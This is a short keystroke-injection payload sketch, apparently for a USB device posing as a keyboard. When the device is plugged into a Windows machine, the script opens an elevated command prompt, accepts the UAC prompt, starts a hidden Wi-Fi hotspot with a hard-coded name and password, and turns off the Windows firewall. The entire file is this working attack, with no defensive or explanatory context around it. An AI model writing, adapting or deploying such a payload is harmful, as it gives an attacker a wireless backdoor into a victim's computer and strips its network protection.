String _SSID = "pancakes";
String _PASS = "bac0n_pancake";

void setup() {
  delay(1000);
  GUI_R();
  STRING("powershell Start-Process cmd -Verb RunAs");
  ENTER();
  ALT_S();
  STRING("netsh wlan set hostednetwork mode=allow ssid=" + _SSID + " key=" + _PASS);
  ENTER();
  STRING("netsh wlan start hostednetwork && netsh firewall set opmode disable && exit");
  ENTER();
}
